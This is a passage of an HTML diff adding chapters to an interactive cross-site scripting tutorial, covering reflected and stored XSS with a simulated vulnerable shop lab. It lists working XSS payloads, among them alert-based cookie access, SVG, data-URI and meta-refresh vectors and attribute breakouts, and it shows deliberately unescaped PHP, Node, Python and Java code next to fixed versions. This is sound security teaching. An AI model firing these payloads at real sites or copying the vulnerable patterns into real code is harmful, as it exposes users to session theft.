+<span class="c-tag">&lt;svg&gt;&lt;script&gt;</span>alert(<span class="c-string">'XSS'</span>)<span class="c-tag">&lt;/script&gt;&lt;/svg&gt;</span>
+
+<span class="c-comment">/* 5. Data URI */</span>
+<span class="c-tag">&lt;iframe</span> <span class="c-attr">src</span>=<span class="c-danger">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">/* 6. Meta Refresh (redirect) */</span>
+<span class="c-tag">&lt;meta</span> <span class="c-attr">http-equiv</span>=<span class="c-string">"refresh"</span> <span class="c-attr">content</span>=<span class="c-danger">"0;url=javascript:alert(1)"</span><span class="c-tag">&gt;</span></div>
+    </div>
+
+    <!-- URL ENCODING -->
+    <h2 class="section-heading"><span class="sh-icon">🔤</span> URL Encoding Basics</h2>
+
+    <p class="body-text">
+        URL encoding converts special characters into percent-encoded format. Attackers use encoding to bypass filters, while developers use it to safely handle user input in URLs.
+    </p>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Character</th><th>URL Encoded</th><th>HTML Entity</th><th>Why It Matters</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><code>&lt;</code></td><td><code>%3C</code></td><td><code>&amp;lt;</code></td><td>Opens HTML tags</td></tr>
+                <tr><td><code>&gt;</code></td><td><code>%3E</code></td><td><code>&amp;gt;</code></td><td>Closes HTML tags</td></tr>
+                <tr><td><code>"</code></td><td><code>%22</code></td><td><code>&amp;quot;</code></td><td>Breaks out of attributes</td></tr>
+                <tr><td><code>'</code></td><td><code>%27</code></td><td><code>&amp;#x27;</code></td><td>Breaks out of JS strings</td></tr>
+                <tr><td><code>/</code></td><td><code>%2F</code></td><td><code>&amp;#x2F;</code></td><td>Closes tags / paths</td></tr>
+                <tr><td><code>(</code></td><td><code>%28</code></td><td><code>&amp;#40;</code></td><td>Function calls</td></tr>
+                <tr><td><code>)</code></td><td><code>%29</code></td><td><code>&amp;#41;</code></td><td>Function calls</td></tr>
+                <tr><td><code>&amp;</code></td><td><code>%26</code></td><td><code>&amp;amp;</code></td><td>Entity separator</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="info-box info">
+        <div class="ib-icon">💡</div>
+        <div class="ib-content">
+            <strong>Key Takeaway:</strong>
+            <p>These 4 fundamentals — SOP, HTTP, Cookies, and DOM — form the foundation of all XSS attacks. The SOP should prevent cross-origin access, but XSS bypasses it by executing within the trusted origin. Cookies without HttpOnly can be stolen. Dangerous DOM methods enable client-side injection.</p>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(0)">← Introduction</button>
+        <button class="btn btn-primary" onclick="navigateTo(2)">Next: Reflected XSS →</button>
+    </div>
+</div>
+
+
+<!-- ================================================================
+     PAGE 2 — REFLECTED XSS
+     ================================================================ -->
+<div class="page" id="page-2">
+    <div class="page-header">
+        <div class="chapter-badge badge-attack2">↩️ Chapter 3</div>
+        <h1 class="page-title">Reflected XSS</h1>
+        <p class="page-subtitle">The most common type of XSS. The malicious payload is included in the request (usually the URL) and "reflected" back by the server in its HTTP response without proper sanitization.</p>
+    </div>
+
+    <div class="grid-3" style="margin-bottom:30px;">
+        <div class="stat-card"><span class="stat-num" style="background:linear-gradient(135deg,var(--orange),var(--yellow));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Type 1</span><span class="stat-label">Classification</span></div>
+        <div class="stat-card"><span class="stat-num" style="background:linear-gradient(135deg,var(--red),var(--orange));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">~75%</span><span class="stat-label">of all XSS reports</span></div>
+        <div class="stat-card"><span class="stat-num" style="background:linear-gradient(135deg,var(--yellow),var(--orange));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">URL</span><span class="stat-label">Payload location</span></div>
+    </div>
+
+    <!-- HOW IT WORKS -->
+    <h2 class="section-heading"><span class="sh-icon">🔄</span> How Reflected XSS Works</h2>
+
+    <p class="body-text">Reflected XSS requires a victim to click a crafted URL. Here's the step-by-step attack flow:</p>
+
+    <div class="flow-container">
+        <div class="attack-steps">
+            <div class="attack-step">
+                <div class="as-num">1</div>
+                <div class="as-emoji">😈</div>
+                <div class="as-content">
+                    <h4>Attacker Crafts Malicious URL</h4>
+                    <p>Creates a URL with an XSS payload in a query parameter: <code style="color:var(--red);">site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+                </div>
+            </div>
+            <div class="attack-step">
+                <div class="as-num">2</div>
+                <div class="as-emoji">📧</div>
+                <div class="as-content">
+                    <h4>Social Engineering — Deliver the Link</h4>
+                    <p>Sends the URL via email, SMS, social media, forum post, or URL shortener to disguise the malicious payload. The victim thinks they're clicking a normal link.</p>
+                </div>
+            </div>
+            <div class="attack-step">
+                <div class="as-num">3</div>
+                <div class="as-emoji">🖥️</div>
+                <div class="as-content">
+                    <h4>Server Reflects Payload Without Sanitizing</h4>
+                    <p>The vulnerable server takes the user input from the URL and includes it directly in the HTML response without encoding: <code style="color:var(--red);">&lt;h2&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;</code></p>
+                </div>
+            </div>
+            <div class="attack-step">
+                <div class="as-num">4</div>
+                <div class="as-emoji">🌐</div>
+                <div class="as-content">
+                    <h4>Victim's Browser Executes the Script</h4>
+                    <p>The browser parses the HTML response, finds the injected &lt;script&gt; tag, and executes it — because it came from the trusted website origin.</p>
+                </div>
+            </div>
+            <div class="attack-step" style="border-left-color:var(--red);">
+                <div class="as-num" style="background:linear-gradient(135deg,var(--red),#ff6666);">5</div>
+                <div class="as-emoji">💀</div>
+                <div class="as-content">
+                    <h4>Attack Succeeds — Data Stolen</h4>
+                    <p>Cookies are sent to attacker's server, fake login form is shown, keylogger is installed, or account actions are performed — all without the victim's knowledge.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VULNERABLE CODE -->
+    <h2 class="section-heading"><span class="sh-icon">📝</span> Vulnerable vs. Fixed Code</h2>
+
+    <div class="tabs">
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="switchTab(this, 'ref-php')">🐘 PHP</button>
+            <button class="tab-btn" onclick="switchTab(this, 'ref-node')">🟩 Node.js</button>
+            <button class="tab-btn" onclick="switchTab(this, 'ref-python')">🐍 Python</button>
+            <button class="tab-btn" onclick="switchTab(this, 'ref-java')">☕ Java</button>
+        </div>
+        <div class="tab-pane active" id="ref-php">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">PHP — Search Page</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// ❌ VULNERABLE — User input reflected directly</span>
+<span class="c-var">$search</span> = <span class="c-danger">$_GET['q']</span>;
+<span class="c-keyword">echo</span> <span class="c-string">"&lt;h2&gt;Results for: "</span> . <span class="c-danger">$search</span> . <span class="c-string">"&lt;/h2&gt;"</span>;
+<span class="c-comment">// If q = &lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="c-comment">// Output: &lt;h2&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;</span>
+<span class="c-comment">// → Browser executes the script!</span>
+
+<span class="c-comment">// ─────────────────────────────────────────────</span>
+
+<span class="c-comment">// ✅ FIXED — HTML encode the output</span>
+<span class="c-var">$search</span> = <span class="c-safe">htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8')</span>;
+<span class="c-keyword">echo</span> <span class="c-string">"&lt;h2&gt;Results for: "</span> . <span class="c-safe">$search</span> . <span class="c-string">"&lt;/h2&gt;"</span>;
+<span class="c-comment">// Output: &lt;h2&gt;Results for: &amp;lt;script&amp;gt;alert(1)...&lt;/h2&gt;</span>
+<span class="c-comment">// → Browser shows text, does NOT execute!</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="ref-node">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Node.js / Express</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// ❌ VULNERABLE</span>
+app.get(<span class="c-string">'/search'</span>, (req, res) =&gt; {
+    <span class="c-keyword">const</span> query = <span class="c-danger">req.query.q</span>;
+    res.send(<span class="c-string">`&lt;h2&gt;Results for: ${</span><span class="c-danger">query</span><span class="c-string">}&lt;/h2&gt;`</span>);
+});
+
+<span class="c-comment">// ✅ FIXED — Using escape-html library</span>
+<span class="c-keyword">const</span> escapeHtml = require(<span class="c-string">'escape-html'</span>);
+
+app.get(<span class="c-string">'/search'</span>, (req, res) =&gt; {
+    <span class="c-keyword">const</span> query = <span class="c-safe">escapeHtml(req.query.q)</span>;
+    res.send(<span class="c-string">`&lt;h2&gt;Results for: ${</span><span class="c-safe">query</span><span class="c-string">}&lt;/h2&gt;`</span>);
+});</div>
+            </div>
+        </div>
+        <div class="tab-pane" id="ref-python">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Python / Flask</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment"># ❌ VULNERABLE — Raw string interpolation</span>
+@app.route(<span class="c-string">'/search'</span>)
+<span class="c-keyword">def</span> <span class="c-func">search</span>():
+    query = <span class="c-danger">request.args.get('q', '')</span>
+    <span class="c-keyword">return</span> f<span class="c-string">'&lt;h2&gt;Results for: {</span><span class="c-danger">query</span><span class="c-string">}&lt;/h2&gt;'</span>
+
+<span class="c-comment"># ✅ FIXED — Use Jinja2 templates (auto-escapes!)</span>
+@app.route(<span class="c-string">'/search'</span>)
+<span class="c-keyword">def</span> <span class="c-func">search</span>():
+    query = request.args.get(<span class="c-string">'q'</span>, <span class="c-string">''</span>)
+    <span class="c-keyword">return</span> render_template(<span class="c-string">'search.html'</span>, query=<span class="c-safe">query</span>)
+<span class="c-comment"># In template: {{ query }} auto-encodes HTML entities</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="ref-java">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Java Servlet</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// ❌ VULNERABLE</span>
+String query = <span class="c-danger">request.getParameter("q")</span>;
+response.getWriter().println(
+    <span class="c-string">"&lt;h2&gt;Results for: "</span> + <span class="c-danger">query</span> + <span class="c-string">"&lt;/h2&gt;"</span>
+);
+
+<span class="c-comment">// ✅ FIXED — Using OWASP Java Encoder</span>
+<span class="c-keyword">import</span> org.owasp.encoder.Encode;
+
+String query = request.getParameter(<span class="c-string">"q"</span>);
+response.getWriter().println(
+    <span class="c-string">"&lt;h2&gt;Results for: "</span> + <span class="c-safe">Encode.forHtml(query)</span> + <span class="c-string">"&lt;/h2&gt;"</span>
+);</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CHARACTERISTICS -->
+    <h2 class="section-heading"><span class="sh-icon">📋</span> Key Characteristics</h2>
+
+    <div class="grid-2">
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">⚠️</div>Attack Properties</div>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-no">✗</span> Non-persistent — payload NOT stored on server</li>
+                <li><span class="cl-icon cl-no">✗</span> Requires social engineering to deliver URL</li>
+                <li><span class="cl-icon cl-no">✗</span> Payload visible in URL (can be shortened/encoded)</li>
+                <li><span class="cl-icon cl-no">✗</span> Server processes and reflects the payload</li>
+                <li><span class="cl-icon cl-no">✗</span> Affects only the user who clicks the link</li>
+            </ul>
+        </div>
+        <div class="card card-accent-orange">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,136,0,0.15)">📍</div>Where to Look</div>
+            <ul class="checklist">
+                <li><span class="cl-icon cl-info">→</span> Search result pages (most common)</li>
+                <li><span class="cl-icon cl-info">→</span> Error messages showing user input</li>
+                <li><span class="cl-icon cl-info">→</span> Login forms with error feedback</li>
+                <li><span class="cl-icon cl-info">→</span> URL-based navigation / breadcrumbs</li>
+                <li><span class="cl-icon cl-info">→</span> Contact/feedback forms with immediate display</li>
+                <li><span class="cl-icon cl-info">→</span> 404 pages showing the requested URL</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- LAB 1: REFLECTED XSS -->
+    <div class="lab-container">
+        <div class="lab-banner">
+            <div class="lab-banner-icon">🧪</div>
+            <div class="lab-banner-text">
+                <h3>Lab 1: Reflected XSS Simulation</h3>
+                <p>Inject an XSS payload into a vulnerable search page and observe the server's reflected response</p>
+            </div>
+            <div class="lab-difficulty">
+                <div class="lab-diff-label">Difficulty</div>
+                <div class="diff-dots">
+                    <div class="diff-dot active-easy"></div>
+                    <div class="diff-dot active-easy"></div>
+                    <div class="diff-dot"></div>
+                </div>
+            </div>
+        </div>
+        <div class="lab-body">
+            <div class="lab-objective">
+                <div class="lab-objective-label">🎯 Objective</div>
+                <p>The search page below reflects user input without sanitization. Inject an XSS payload that would execute JavaScript. The simulation shows what happens when reflected XSS succeeds.</p>
+            </div>
+
+            <div class="info-box yellow">
+                <div class="ib-icon">🔬</div>
+                <div class="ib-content">
+                    <strong>Safe Simulation:</strong>
+                    <p>No real code executes. This demonstrates how reflected XSS would work in a real vulnerable application.</p>
+                </div>
+            </div>
+
+            <!-- Simulated Browser -->
+            <div class="lab-browser">
+                <div class="browser-chrome">
+                    <div class="browser-dots">
+                        <span class="browser-dot bd-close"></span>
+                        <span class="browser-dot bd-min"></span>
+                        <span class="browser-dot bd-max"></span>
+                    </div>
+                    <div class="browser-url-bar">
+                        <span class="url-lock">🔒</span>
+                        <span class="url-text" id="reflected-url-text">https://vulnerable-shop.com/search?q=</span>
+                    </div>
+                </div>
+                <div class="browser-content">
+                    <div style="background:#2d6cdf;padding:12px 20px;display:flex;align-items:center;gap:12px;">
+                        <span style="color:white;font-weight:900;font-size:1.05rem;">🛒 VulnerableShop</span>
+                        <span style="color:rgba(255,255,255,0.65);font-size:0.82rem;margin-left:auto;">Home · Products · Cart · Login</span>
+                    </div>
+                    <div style="padding:20px;">
+                        <div style="display:flex;gap:8px;margin-bottom:16px;">
+                            <input type="text" id="reflected-input" placeholder="Search products…"
+                                   style="flex:1;padding:10px 16px;border:2px solid #ddd;border-radius:8px;font-size:0.92rem;font-family:Arial;transition:border 0.3s;"
+                                   onfocus="this.style.borderColor='#2d6cdf'" onblur="this.style.borderColor='#ddd'"
+                                   oninput="updateReflectedURL(this.value)">
+                            <button onclick="runReflectedXSS()"
+                                    style="padding:10px 22px;background:#2d6cdf;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:700;font-size:0.9rem;">
+                                🔍 Search
+                            </button>
+                        </div>
+                        <div id="reflected-output" style="padding:16px;background:#f8f9fa;border-radius:8px;border:1px solid #eee;min-height:50px;font-size:0.92rem;color:#333;">
+                            <span style="color:#999;">Enter a search term and click Search…</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Panels: Payloads + Analysis -->
+            <div class="lab-panels">
+                <div class="lab-panel">
+                    <div class="lab-panel-header">🎯 Try These Payloads</div>
+                    <div class="lab-panel-body">
+                        <div class="payload-grid">
+                            <div class="payload-item" onclick="setReflectedPayload('Laptop')">
+                                <span class="pi-code">Laptop</span>
+                                <span class="pi-label tag tag-green">Normal</span>
+                            </div>
+                            <div class="payload-item" onclick="setReflectedPayload('<script>alert(1)</script>')">
+                                <span class="pi-code">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+                                <span class="pi-label tag tag-red">Basic XSS</span>
+                            </div>
+                            <div class="payload-item" onclick="setReflectedPayload('<img src=x onerror=alert(document.cookie)>')">
+                                <span class="pi-code">&lt;img src=x onerror=alert(cookie)&gt;</span>
+                                <span class="pi-label tag tag-red">Cookie Steal</span>
+                            </div>
+                            <div class="payload-item" onclick="setReflectedPayload('<svg onload=alert(document.domain)>')">
+                                <span class="pi-code">&lt;svg onload=alert(domain)&gt;</span>
+                                <span class="pi-label tag tag-orange">SVG</span>
+                            </div>
+                            <div class="payload-item" onclick="setReflectedPayload('<details open ontoggle=alert(1)>')">
+                                <span class="pi-code">&lt;details open ontoggle=alert(1)&gt;</span>
+                                <span class="pi-label tag tag-orange">Details</span>
+                            </div>
+                            <div class="payload-item" onclick="setReflectedPayload('&quot; onfocus=alert(1) autofocus &quot;')">
+                                <span class="pi-code">" onfocus=alert(1) autofocus "</span>
+                                <span class="pi-label tag tag-yellow">Attribute</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="lab-panel">
+                    <div class="lab-panel-header">📊 Analysis</div>
+                    <div class="lab-panel-body">
+                        <div class="lab-output" id="reflected-analysis" style="min-height:200px;">Waiting for input...</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="reflected-result"></div>
+
+            <!-- Hint -->
+            <div class="hint-wrapper">
+                <div class="hint-toggle" id="hint-toggle-reflected" onclick="toggleHint('reflected')">
+                    <span>💡</span>
+                    <span class="hint-label">Show Hints</span>
+                    <span class="hint-chevron">▼</span>
+                </div>
+                <div class="hint-body" id="hint-body-reflected">
+                    <div class="hint-item">
+                        <div class="hint-num">1</div>
+                        <div>The search page includes your input directly in the HTML: <code>You searched for: [YOUR INPUT]</code></div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">2</div>
+                        <div>Try injecting a script tag: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">3</div>
+                        <div>If script tags are blocked, try: <code>&lt;img src=x onerror=alert(1)&gt;</code> — the failed image load triggers the event handler.</div>
+                    </div>
+                    <div class="hint-item">
+                        <div class="hint-num">🛡️</div>
+                        <div><strong>Prevention:</strong> Use <code>htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code> in PHP or equivalent encoding in your framework.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(1)">← Web Fundamentals</button>
+        <button class="btn btn-primary" onclick="navigateTo(3)">Next: Stored XSS →</button>
+    </div>
+</div>
+
+<!-- ================================================================
+     PAGE 3 — STORED XSS
+     ================================================================ -->
+<div class="page" id="page-3">
+    <div class="page-header">
+        <div class="chapter-badge badge-attack">💾 Chapter 4</div>
+        <h1 class="page-title">Stored XSS</h1>
+        <p class="page-subtitle">The most dangerous type of XSS. The malicious payload is permanently saved on the server — in a database, file system, or cache — and executes for every single user who views the infected content.</p>
+    </div>
+
+    <!-- Stats -->
+    <div class="grid-3" style="margin-bottom:30px;">
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--red),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Type 2</span>
+            <span class="stat-label">Classification</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--red),#ff6666);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Critical</span>
+            <span class="stat-label">Severity Rating</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--red),var(--orange));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">∞</span>
+            <span class="stat-label">Victims per payload</span>
+        </div>
+    </div>
+
+    <!-- KEY DIFFERENCE -->
+    <div class="info-box danger">
+        <div class="ib-icon">💀</div>
+        <div class="ib-content">
+            <strong>Key Difference from Reflected XSS:</strong>
+            <p>In Reflected XSS, the attacker must trick each victim into clicking a link. In <strong>Stored XSS, the payload is saved once and fires automatically</strong> for every visitor — including administrators. No social engineering needed after the initial injection!</p>
+        </div>
+    </div>
+
+    <!-- HOW IT WORKS — 2 PHASE DIAGRAM -->
+    <h2 class="section-heading"><span class="sh-icon">🔄</span> How Stored XSS Works</h2>
+
+    <p class="body-text">Stored XSS operates in two distinct phases — the attacker only needs to perform Phase 1 once. Phase 2 repeats automatically for every visitor.</p>
+
+    <div class="grid-2">
+        <!-- Phase 1 -->
+        <div class="card" style="border-top:3px solid var(--red);">
+            <div class="card-title" style="color:var(--red);">
+                <div class="ct-icon" style="background:rgba(213,0,0,0.15)">1️⃣</div>
+                Phase 1: Injection (Once)
+            </div>
+            <div class="attack-steps">
+                <div class="attack-step" style="border-left-color:var(--red);">
+                    <div class="as-num" style="background:var(--red);">1</div>
+                    <div class="as-emoji">😈</div>
+                    <div class="as-content">
+                        <h4>Attacker Submits Malicious Content</h4>
+                        <p>Posts a comment, updates a profile, sends a message, or uploads a file name containing the XSS payload.</p>
+                    </div>
+                </div>
+                <div class="attack-step" style="border-left-color:var(--red);">
+                    <div class="as-num" style="background:var(--red);">2</div>
+                    <div class="as-emoji">💾</div>
+                    <div class="as-content">
+                        <h4>Server Stores Without Sanitizing</h4>
+                        <p>The payload is saved directly into the database, file, or cache without any validation or encoding.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Phase 2 -->
+        <div class="card" style="border-top:3px solid var(--orange);">
+            <div class="card-title" style="color:var(--orange);">
+                <div class="ct-icon" style="background:rgba(255,136,0,0.15)">🔁</div>
+                Phase 2: Execution (Every Visitor!)
+            </div>
+            <div class="attack-steps">
+                <div class="attack-step" style="border-left-color:var(--orange);">
+                    <div class="as-num" style="background:var(--orange);">3</div>
+                    <div class="as-emoji">👥</div>
+                    <div class="as-content">
+                        <h4>Any User Visits the Page</h4>
+                        <p>Regular user, admin, moderator — anyone who loads the page. No special link needed.</p>
+                    </div>
+                </div>
+                <div class="attack-step" style="border-left-color:var(--orange);">
+                    <div class="as-num" style="background:var(--orange);">4</div>
+                    <div class="as-emoji">💀</div>
+                    <div class="as-content">
+                        <h4>Stored Payload Executes</h4>
+                        <p>Browser receives the stored script in the HTML, executes it — cookies stolen, actions performed, admin compromised.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VISUAL FLOW -->
+    <div class="flow-container">
+        <div class="flow-horizontal" style="justify-content:center;">
+            <div class="flow-step">
+                <div class="flow-step-num" style="background:var(--red);">1</div>
+                <div class="flow-box flow-box-attacker">😈 Attacker<br>Posts Payload</div>
+                <div class="flow-step-label">Malicious comment</div>
+            </div>
+            <div class="flow-arrow">──→</div>
+            <div class="flow-step">
+                <div class="flow-step-num" style="background:var(--red);">2</div>
+                <div class="flow-box flow-box-server">🖥️ Server<br>Saves to DB</div>
+                <div class="flow-step-label">Stored unsanitized</div>
+            </div>
+            <div class="flow-arrow">──→</div>
+            <div class="flow-step">
+                <div class="flow-step-num" style="background:var(--primary);">3</div>
+                <div class="flow-box flow-box-db">💾 Database<br>Payload Stored</div>
+                <div class="flow-step-label">Persistent</div>
+            </div>
+            <div class="flow-arrow">──→</div>
+            <div class="flow-step">
+                <div class="flow-step-num" style="background:var(--orange);">4</div>
+                <div class="flow-box flow-box-victim">👥 Victims<br>View Page</div>
+                <div class="flow-step-label">Every visitor</div>
+            </div>
+            <div class="flow-arrow">──→</div>
+            <div class="flow-step">
+                <div class="flow-step-num" style="background:var(--red);">5</div>
+                <div class="flow-box flow-box-result">💀 Script<br>Executes</div>
+                <div class="flow-step-label">Data stolen</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- COMMON INJECTION POINTS -->
+    <h2 class="section-heading"><span class="sh-icon">📍</span> Common Injection Points</h2>
+
+    <p class="body-text">Stored XSS can hide in many places. Any feature that saves user input and later displays it to other users is a potential target:</p>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Injection Point</th><th>Examples</th><th>Who Sees It?</th><th>Risk</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Comments / Forums</strong></td>
+                    <td>Blog comments, discussion boards, Q&A answers</td>
+                    <td>All visitors</td>
+                    <td><span class="severity-critical">CRITICAL</span></td>
+                </tr>
+                <tr>
+                    <td><strong>User Profiles</strong></td>
+                    <td>Display name, bio, location, website, avatar alt text</td>
+                    <td>Anyone viewing the profile</td>
+                    <td><span class="severity-critical">CRITICAL</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Product Reviews</strong></td>
+                    <td>E-commerce reviews, star rating text, Q&A sections</td>
+                    <td>All shoppers</td>
+                    <td><span class="severity-high">HIGH</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Private Messages</strong></td>
+                    <td>DMs, chat systems, email subjects in webmail</td>
+                    <td>Message recipient</td>
+                    <td><span class="severity-high">HIGH</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Support Tickets</strong></td>
+                    <td>Help desk descriptions, bug reports</td>
+                    <td>Support agents / Admins</td>
+                    <td><span class="severity-critical">CRITICAL (Blind)</span></td>
+                </tr>
+                <tr>
+                    <td><strong>File Names</strong></td>
+                    <td>Uploaded file names displayed on page</td>
+                    <td>Anyone viewing the file listing</td>
+                    <td><span class="severity-medium">MEDIUM</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Admin / Log Viewers</strong></td>
+                    <td>User-Agent logs, error logs, activity dashboards</td>
+                    <td>Admins only → Blind XSS</td>
+                    <td><span class="severity-critical">CRITICAL</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Shared Documents</strong></td>
+                    <td>Wiki pages, shared notes, collaborative docs</td>
+                    <td>All collaborators</td>
+                    <td><span class="severity-high">HIGH</span></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- VULNERABLE CODE -->
+    <h2 class="section-heading"><span class="sh-icon">📝</span> Vulnerable vs. Fixed Code</h2>
+
+    <div class="tabs">
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="switchTab(this, 'stored-php')">🐘 PHP</button>
+            <button class="tab-btn" onclick="switchTab(this, 'stored-node')">🟩 Node.js</button>
+        </div>
+        <div class="tab-pane active" id="stored-php">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">PHP — Comment System</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// ════════════════════════════════════</span>
+<span class="c-comment">// ❌ VULNERABLE — Storing & Displaying</span>
+<span class="c-comment">// ════════════════════════════════════</span>
+
+<span class="c-comment">// Storing — NO sanitization</span>
+<span class="c-var">$name</span>    = <span class="c-danger">$_POST['name']</span>;
+<span class="c-var">$comment</span> = <span class="c-danger">$_POST['comment']</span>;
+<span class="c-var">$stmt</span> = <span class="c-var">$pdo</span>-&gt;prepare(<span class="c-string">"INSERT INTO comments (name, comment) VALUES (?, ?)"</span>);
+<span class="c-var">$stmt</span>-&gt;execute([<span class="c-var">$name</span>, <span class="c-danger">$comment</span>]);
+
+<span class="c-comment">// Displaying — NO encoding</span>
+<span class="c-keyword">foreach</span> (<span class="c-var">$comments</span> <span class="c-keyword">as</span> <span class="c-var">$c</span>) {
+    <span class="c-keyword">echo</span> <span class="c-string">"&lt;strong&gt;"</span> . <span class="c-danger">$c['name']</span> . <span class="c-string">"&lt;/strong&gt;"</span>;
+    <span class="c-keyword">echo</span> <span class="c-string">"&lt;p&gt;"</span> . <span class="c-danger">$c['comment']</span> . <span class="c-string">"&lt;/p&gt;"</span>;
+}
+<span class="c-comment">// If comment = &lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="c-comment">// → Stored in DB → Fires for EVERY visitor!</span>
+
+<span class="c-comment">// ════════════════════════════════════</span>
+<span class="c-comment">// ✅ FIXED — Encode on OUTPUT</span>
+<span class="c-comment">// ════════════════════════════════════</span>
+
+<span class="c-keyword">foreach</span> (<span class="c-var">$comments</span> <span class="c-keyword">as</span> <span class="c-var">$c</span>) {
+    <span class="c-var">$safeName</span>    = <span class="c-safe">htmlspecialchars($c['name'], ENT_QUOTES, 'UTF-8')</span>;
+    <span class="c-var">$safeComment</span> = <span class="c-safe">htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8')</span>;
+    <span class="c-keyword">echo</span> <span class="c-string">"&lt;strong&gt;"</span> . <span class="c-safe">$safeName</span> . <span class="c-string">"&lt;/strong&gt;"</span>;
+    <span class="c-keyword">echo</span> <span class="c-string">"&lt;p&gt;"</span> . <span class="c-safe">$safeComment</span> . <span class="c-string">"&lt;/p&gt;"</span>;
+}</div>
+            </div>
+        </div>
+        <div class="tab-pane" id="stored-node">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Node.js / Express + MongoDB</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// ❌ VULNERABLE — Store raw, display raw</span>
+app.post(<span class="c-string">'/comment'</span>, <span class="c-keyword">async</span> (req, res) =&gt; {
+    <span class="c-keyword">await</span> db.collection(<span class="c-string">'comments'</span>).insertOne({
+        name: <span class="c-danger">req.body.name</span>,
+        comment: <span class="c-danger">req.body.comment</span>
+    });
+});
+
+app.get(<span class="c-string">'/comments'</span>, <span class="c-keyword">async</span> (req, res) =&gt; {
+    <span class="c-keyword">const</span> comments = <span class="c-keyword">await</span> db.collection(<span class="c-string">'comments'</span>).find().toArray();
+    <span class="c-keyword">let</span> html = comments.map(c =&gt;
